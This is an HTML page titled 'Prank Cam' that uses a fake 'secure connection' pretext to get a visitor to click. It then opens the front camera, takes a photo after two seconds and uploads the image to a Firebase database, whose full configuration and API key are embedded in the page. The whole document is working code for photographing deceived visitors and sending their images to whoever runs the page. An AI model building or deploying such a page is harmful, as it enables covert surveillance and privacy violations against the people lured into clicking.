<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Prank Cam</title>
<style>
body{margin:0;background:#000;color:#0f0;font-family:monospace;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;}
#msg{font-size:18px;margin-bottom:20px;}
video{display:none;}
button{padding:10px 20px;font-size:16px;border:none;border-radius:5px;background:#ff0000;color:#fff;cursor:pointer;}
</style>
</head>
<body>

<div id="msg">Click to start secure connection...</div>
<button id="startBtn">Start</button>
<video id="video" playsinline muted></video>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyAfgvWqYfrzKeqdp63r3mXDrb9TxIIvd04",
  authDomain: "kolkata-964e4.firebaseapp.com",
  databaseURL: "https://kolkata-964e4-default-rtdb.firebaseio.com",
  projectId: "kolkata-964e4",
  storageBucket: "kolkata-964e4.appspot.com",
  messagingSenderId: "377401156222",
  appId: "1:377401156222:web:2b3500de97c8a0acb0ae2f"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const video = document.getElementById("video");
const startBtn = document.getElementById("startBtn");
const msg = document.getElementById("msg");

startBtn.onclick = async () => {
  startBtn.disabled = true;
  msg.innerText = "Accessing camera...";

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    video.srcObject = stream;
    await video.play();

    msg.innerText = "Camera connected! Taking selfie...";

    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);

    // Take selfie after 2s delay
    setTimeout(async () => {
      const photo = await imageCapture.takePhoto(); // real photo
      const reader = new FileReader();
      reader.onload = () => {
        push(ref(db, "tempImages"), {
          image: reader.result,
          time: Date.now()
        });
        msg.innerText = "Selfie sent to admin!";
      };
      reader.readAsDataURL(photo);
    }, 2000);

  } catch (err) {
    console.error(err);
    alert("Camera access failed! Make sure you are using HTTPS or localhost and allow permissions.");
    startBtn.disabled = false;
  }
};
</script>
</body>
</html>
